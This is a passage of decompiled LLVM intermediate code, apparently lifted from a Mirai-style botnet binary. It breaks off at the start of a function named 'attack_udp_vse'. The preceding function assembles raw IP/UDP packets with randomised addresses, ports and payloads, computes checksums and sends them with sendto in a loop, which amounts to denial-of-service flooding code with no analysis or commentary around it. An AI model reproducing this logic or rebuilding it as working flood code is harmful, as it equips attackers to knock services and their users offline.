  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
  %v5_bb9c = icmp slt i32 %v0_bb8c, %v1_bb8c
  br i1 %v5_bb9c, label %dec_label_pc_bae8, label %dec_label_pc_bba0.preheader.loopexit

dec_label_pc_bba0.preheader.loopexit:             ; preds = %.thread8
  %v0_bba4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_bba0.preheader:                      ; preds = %.thread, %dec_label_pc_bba0.preheader.loopexit
  %v0_bba4.pre = phi i32 [ %v0_bba4.pre.pre, %dec_label_pc_bba0.preheader.loopexit ], [ 0, %.thread ]
  %v3_bd0c = icmp eq i32 %v6_b9cc, -1
  %v8_bd0c = icmp eq i32 %v6_b9cc, -1
  %v3_bd24 = icmp eq i32 %v3_ba5c, 65535
  %v2_bd60 = icmp eq i32 %v1_b9b8, 0
  br label %dec_label_pc_bba0

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0, %dec_label_pc_bba0.preheader
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bba0.preheader ], [ 0, %dec_label_pc_bca0 ], [ 0, %dec_label_pc_bba0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bba4 = icmp eq i32 %v0_bba4, 0
  store i1 %v2_bba4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bba4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bbb0
  %v1_bbc8 = phi i32 [ %v1_bc90, %dec_label_pc_bc1c ], [ 0, %dec_label_pc_bbb0 ]
  %v5_bbb8 = mul i32 %v1_bbc8, 24
  %v1_bbbc = load i32, i32* @r8, align 4
  %v2_bbbc = add i32 %v1_bbbc, %v5_bbb8
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r1.global-to-local, align 4
  %v1_bbc4 = add i32 %v2_bbbc, 20
  %v2_bbc4 = inttoptr i32 %v1_bbc4 to i8*
  %v3_bbc4 = load i8, i8* %v2_bbc4, align 1
  %v4_bbc4 = zext i8 %v3_bbc4 to i32
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v4_bbc8 = mul i32 %v1_bbc8, 4
  %v5_bbc8 = add i32 %v4_bbc8, %v2_b8c4
  %v6_bbc8 = inttoptr i32 %v5_bbc8 to i32*
  %v7_bbc8 = load i32, i32* %v6_bbc8, align 4
  store i32 %v7_bbc8, i32* @r5, align 4
  %v7_bbcc = icmp eq i8 %v3_bbc4, 31
  store i1 %v7_bbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_bbd0 = add i32 %v7_bbc8, 20
  store i32 %v1_bbd0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bbc4, 32
  br i1 %tmp62, label %dec_label_pc_bcb4, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbb4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge, %dec_label_pc_bbe4
  %v1_bbfc = phi i32 [ %v1_bbfc.pre, %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge ], [ 65535, %dec_label_pc_bbe4 ]
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v9_bbfc = icmp eq i32 %v3_ba3c, %v1_bbfc
  store i1 %v9_bbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbfc, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v1_bc08 = phi i32 [ %v1_bd3c, %dec_label_pc_bd30 ], [ %v1_bbfc, %dec_label_pc_bbf8 ]
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v9_bc08 = icmp eq i32 %v3_ba54, %v1_bc08
  store i1 %v9_bc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc08, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58, %dec_label_pc_bd6c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bc20 = load i32, i32* @r5, align 4
  %v3_bc20 = add i32 %v2_bc20, 10
  %v4_bc20 = inttoptr i32 %v3_bc20 to i16*
  store i16 0, i16* %v4_bc20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* @r0, align 4
  %v2_bc2c = call i32 @checksum_generic(i32 %v0_bc28, i32 20)
  %v3_bc2c = trunc i32 %v2_bc2c to i16
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 10
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v3_bc2c, i16* %v5_bc30, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc38 = load i32, i32* @r6, align 4
  %v3_bc38 = add i32 %v2_bc38, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i16*
  store i16 0, i16* %v4_bc38, align 2
  %v0_bc3c = load i32, i32* @r6, align 4
  store i32 %v0_bc3c, i32* @r1, align 4
  %v1_bc40 = add i32 %v0_bc3c, 4
  %v2_bc40 = inttoptr i32 %v1_bc40 to i16*
  %v3_bc40 = load i16, i16* %v2_bc40, align 2
  %v4_bc40 = zext i16 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r2.global-to-local, align 4
  %v0_bc44 = load i32, i32* @sl, align 4
  store i32 %v0_bc44, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r5, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = call i32 @checksum_tcpudp(i32 %v0_bc48, i32 %v0_bc3c, i32 %v4_bc40, i32 %v0_bc44)
  %v5_bc4c = trunc i32 %v4_bc4c to i16
  store i32 %v4_bc4c, i32* %r0.global-to-local, align 4
  %v3_bc50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = mul i32 %v3_bc50, 32
  store i32 %v3_bc54, i32* %lr.global-to-local, align 4
  %v3_bc58 = load i32, i32* @r6, align 4
  %v4_bc58 = add i32 %v3_bc58, 6
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v5_bc4c, i16* %v5_bc58, align 2
  %v0_bc5c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc5c, -8
  %v5_bc5c = add i32 %v0_bc5c, %tmp63
  store i32 %v5_bc5c, i32* %lr.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r6, align 4
  %v1_bc60 = add i32 %v0_bc60, 2
  %v2_bc60 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc60 = load i16, i16* %v2_bc60, align 2
  %v4_bc60 = zext i16 %v3_bc60 to i32
  store i32 %v4_bc60, i32* @r6, align 4
  %v1_bc64 = load i32, i32* @r8, align 4
  %v2_bc64 = add i32 %v1_bc64, %v5_bc5c
  store i32 %v2_bc64, i32* @lr, align 4
  %v3_bc68 = add i32 %v2_bc64, 2
  %v4_bc68 = inttoptr i32 %v3_bc68 to i16*
  store i16 %v3_bc60, i16* %v4_bc68, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc74 = load i32, i32* @r5, align 4
  store i32 %v0_bc74, i32* %r1.global-to-local, align 4
  %v0_bc78 = load i32, i32* @fp, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v0_bc7c = load i32, i32* @sb, align 4
  store i32 %v0_bc7c, i32* %r2.global-to-local, align 4
  %v0_bc80 = load i32, i32* @lr, align 4
  %v6_bc88 = call i32 @__libc_sendto(i32 %v0_bc78, i32 %v0_bc74, i32 %v0_bc7c, i32 16384, i32 %v0_bc80, i32 16)
  %v3_bc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = add i32 %v3_bc8c, 1
  store i32 %v1_bc90, i32* %r0.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r7, align 4
  %v9_bc94 = icmp eq i32 %v1_bc90, %v1_bc94
  store i1 %v9_bc94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc90, i32* %stack_var_-44, align 4
  %v5_bc9c = icmp slt i32 %v1_bc90, %v1_bc94
  br i1 %v5_bc9c, label %dec_label_pc_bbb4, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bca4 = icmp eq i32 %v1_bc94, 0
  store i1 %v2_bca4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bca4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bbb4
  %v1_bcb4 = add i32 %v2_bbbc, 16
  %v2_bcb4 = inttoptr i32 %v1_bcb4 to i32*
  %v3_bcb4 = load i32, i32* %v2_bcb4, align 4
  %v0_bcb8 = call i32 @rand_next()
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-44, align 4
  %v5_bcc4 = mul i32 %v3_bcbc, 24
  %v1_bcc8 = and i32 %v3_bcb4, 16711680
  store i32 %v1_bcc8, i32* %ip.global-to-local, align 4
  %v3_bccc = udiv i32 %v3_bcb4, 16777216
  %v4_bcd0 = udiv i32 %v1_bcc8, 256
  %v5_bcd0 = or i32 %v4_bcd0, %v3_bccc
  store i32 %v5_bcd0, i32* %r2.global-to-local, align 4
  %v1_bcd4 = load i32, i32* @r8, align 4
  %v2_bcd4 = add i32 %v1_bcd4, %v5_bcc4
  store i32 %v2_bcd4, i32* %r1.global-to-local, align 4
  %v1_bcd8 = and i32 %v3_bcb4, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_bcd8, i32* %r3.global-to-local, align 4
  %v1_bcdc = add i32 %v2_bcd4, 20
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %ip.global-to-local, align 4
  %v4_bce0 = mul i32 %v1_bcd8, 256
  %v4_bce4 = mul i32 %v3_bcb4, 16777216
  %v5_bce0 = or i32 %v4_bce0, %v4_bce4
  %v5_bce4 = or i32 %v5_bce0, %v5_bcd0
  %v7_bce8 = lshr i32 %v0_bcb8, %v4_bcdc
  %v8_bce8 = add i32 %v7_bce8, %v5_bce4
  store i32 %v8_bce8, i32* %r2.global-to-local, align 4
  %v1_bcec = and i32 %v8_bce8, 16711680
  store i32 %v1_bcec, i32* %r0.global-to-local, align 4
  %v1_bcf8 = and i32 %v8_bce8, 65280
  store i32 %v1_bcf8, i32* %r1.global-to-local, align 4
  %v5_bd00 = call i32 @llvm.bswap.i32(i32 %v8_bce8)
  %v1_bd04 = load i32, i32* @r5, align 4
  %v2_bd04 = add i32 %v1_bd04, 16
  %v3_bd04 = inttoptr i32 %v2_bd04 to i32*
  store i32 %v5_bd00, i32* %v3_bd04, align 4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  %v0_bd14 = call i32 @rand_next()
  store i32 %v0_bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  %v1_bd28 = load i32, i32* @r5, align 4
  %v2_bd28 = add i32 %v1_bd28, 12
  %v3_bd28 = inttoptr i32 %v2_bd28 to i32*
  store i32 %v0_bd14, i32* %v3_bd28, align 4
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge

dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge:    ; preds = %dec_label_pc_bd14
  %v1_bbfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_bbe4
  %v0_bd30 = call i32 @rand_next()
  %v1_bd30 = trunc i32 %v0_bd30 to i16
  %v3_bd34 = load i32, i32* @r5, align 4
  %v4_bd34 = add i32 %v3_bd34, 4
  %v5_bd34 = inttoptr i32 %v4_bd34 to i16*
  store i16 %v1_bd30, i16* %v5_bd34, align 2
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v1_bd3c = load i32, i32* @r4, align 4
  %v9_bd3c = icmp eq i32 %v3_ba3c, %v1_bd3c
  store i1 %v9_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd3c, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v0_bd44 = call i32 @rand_next()
  %v1_bd44 = trunc i32 %v0_bd44 to i16
  store i32 %v0_bd44, i32* %r0.global-to-local, align 4
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v9_bd4c = icmp eq i32 %v3_ba54, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd50 = load i32, i32* @r5, align 4
  %v4_bd50 = add i32 %v3_bd50, 20
  %v5_bd50 = inttoptr i32 %v4_bd50 to i16*
  store i16 %v1_bd44, i16* %v5_bd50, align 2
  br i1 %v9_bd4c, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  %v0_bd58 = call i32 @rand_next()
  %v1_bd58 = trunc i32 %v0_bd58 to i16
  store i32 %v0_bd58, i32* %r0.global-to-local, align 4
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  %v3_bd64 = load i32, i32* @r6, align 4
  %v4_bd64 = add i32 %v3_bd64, 2
  %v5_bd64 = inttoptr i32 %v4_bd64 to i16*
  store i16 %v1_bd58, i16* %v5_bd64, align 2
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58
  %v0_bd6c = load i32, i32* @r5, align 4
  %v1_bd6c = add i32 %v0_bd6c, 28
  store i32 %v1_bd6c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  %v2_bd74 = inttoptr i32 %v1_bd6c to i16*
  %v3_bd74 = call i32 @rand_str(i16* %v2_bd74, i32 %v0_ba84)
  store i32 %v3_bd74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc1c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_b9f0
  %v0_bd7c = load i32, i32* @fp, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v1_bd80 = call i32 @__GI___libc_close(i32 %v0_bd7c)
  store i32 %v1_bd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %entry, %dec_label_pc_bd7c
  %v1_bd8c = phi i32 [ %v3_b9e0, %entry ], [ %v1_bd80, %dec_label_pc_bd7c ]
  store i32 %v18_b8a8, i32* %sb.global-to-local, align 4
  store i32 %v27_b8a8, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd8c

; uselistorder directives
  uselistorder i32 %v0_bd58, { 1, 0 }
  uselistorder i32 %v0_bd44, { 1, 0 }
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32 %v3_bcb4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_bc90, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc5c, { 1, 0 }
  uselistorder i32 %v4_bc4c, { 1, 0 }
  uselistorder i1 %v2_bd60, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bd24, { 3, 2, 0, 1 }
  uselistorder i32 %v3_bad0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_bab8, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0, 2 }
  uselistorder i32 %v1_ba84, { 1, 0, 2 }
  uselistorder i32 %v3_ba5c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ba3c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ba34, { 1, 0, 2 }
  uselistorder i32 %v0_ba84, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ba24, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ba10, { 1, 0 }
  uselistorder i1 %v7_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b9cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b9b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b944, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 2, 1, 0 }
  uselistorder i32 %v6_b918, { 1, 0 }
  uselistorder i32 %v7_b900, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b8dc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 (i16*, i32)* @rand_str, { 0, 1, 2, 3, 10, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd84, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba0.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd94 = load i32, i32* @r4, align 4
  %v27_bd94 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bdb0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bdb0, i32* @fp, align 4
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v5_bdc8 = inttoptr i32 %v0_bdb4 to i32*
  %v6_bdc8 = call i32 @attack_get_opt_int(i32 %v0_bdc4, i32* %v5_bdc8, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bdd4 = urem i32 %v6_bdc8, 256
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bde0 = load i32, i32* @r4, align 4
  %v0_bde4 = load i32, i32* @r5, align 4
  %v5_bde8 = trunc i32 %v6_bdc8 to i8
  %v6_bdec = inttoptr i32 %v0_bde4 to i32*
  %v7_bdec = call i32 @attack_get_opt_int(i32 %v0_bde0, i32* %v6_bdec, i32 3, i32 65535, i32 %v6_bdc8)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdec, i32* @r7, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_be0c = urem i32 %v6_be04, 256
  store i32 %v1_be0c, i32* %ip.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_be04, 16777216
  %v5_be24 = sdiv i32 %sext, 16777216
  %v6_be24 = inttoptr i32 %v0_be10 to i32*
  %v7_be24 = call i32 @attack_get_opt_int(i32 %v0_be1c, i32* %v6_be24, i32 5, i32 0, i32 %v5_be24)
  %v1_be30 = urem i32 %v7_be24, 256
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  %v0_be40 = load i32, i32* @r5, align 4
  %v5_be48 = inttoptr i32 %v0_be40 to i32*
  %v6_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v5_be48, i32 6, i32 65535, i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v6_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 25)
  %v3_be7c = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
